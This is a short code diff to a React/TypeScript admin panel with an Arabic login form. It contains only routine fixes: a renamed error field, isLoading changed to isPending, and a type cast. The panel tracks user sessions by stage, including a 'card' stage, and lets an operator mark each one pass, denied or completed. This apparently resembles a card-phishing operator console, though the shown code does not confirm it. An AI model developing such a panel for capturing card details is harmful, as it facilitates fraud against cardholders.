@@ -78,7 +78,7 @@ export default function AdminPanel() {
 
   const handleAction = async (sessionId: string, action: "pass" | "denied" | "completed", errorMsg?: string) => {
     if (!token) return;
-    await actionMutation.mutateAsync({ token, sessionId, action, errorMsg });
+    await actionMutation.mutateAsync({ token, sessionId, action, errorMessage: errorMsg });
     sessionsQuery.refetch();
   };
 
@@ -119,9 +119,9 @@ export default function AdminPanel() {
             <button 
               type="submit" 
               className="w-full bg-[#000576] text-white py-3 rounded-xl font-bold hover:bg-blue-900 transition-all shadow-lg shadow-blue-100"
-              disabled={loginMutation.isLoading}
+              disabled={loginMutation.isPending}
             >
-              {loginMutation.isLoading ? 'جاري التحقق...' : 'دخول النظام'}
+              {loginMutation.isPending ? 'جاري التحقق...' : 'دخول النظام'}
             </button>
           </form>
         </div>
@@ -130,7 +130,7 @@ export default function AdminPanel() {
   }
 
   // Calculate stats
-  const sessions = sessionsQuery.data?.sessions || [];
+  const sessions = (sessionsQuery.data as any)?.sessions || [];
   const stats = {
     total: sessions.length,
     new: sessions.filter((s: any) => s.stage === 'card').length,
